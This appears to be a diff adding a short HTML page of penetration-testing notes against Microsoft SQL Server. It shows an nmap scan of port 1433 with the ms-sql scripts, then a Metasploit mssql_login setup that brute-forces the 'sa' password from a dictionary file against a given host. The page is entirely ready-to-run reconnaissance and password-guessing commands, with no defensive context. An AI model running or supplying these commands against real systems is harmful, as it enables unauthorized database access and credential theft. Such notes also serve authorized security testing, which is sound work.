@@ -1,0 +1,17 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Automatic</title>
+</head><body><b>nmap<br/>
+</b><tt><br/>
+nmap -sV -p 1433 -Pn -T5 --host-timeout 15m --script=ms-sql* -v &lt;IP&gt;<br/>
+<br/>
+</tt><b>Searching for 'sa' user password with metasploit</b><br/>
+<tt><br/>
+use auxiliary/scanner/mssql/mssql_login<br/>
+Set PASS_FILE /root/passwords.txt (the dictionary file)<br/>
+Set RHOSTS 192.168.23.100<br/>
+Set Threads 8<br/>
+Set verbose false<br/>
+run<br/>
+</tt></body></html>
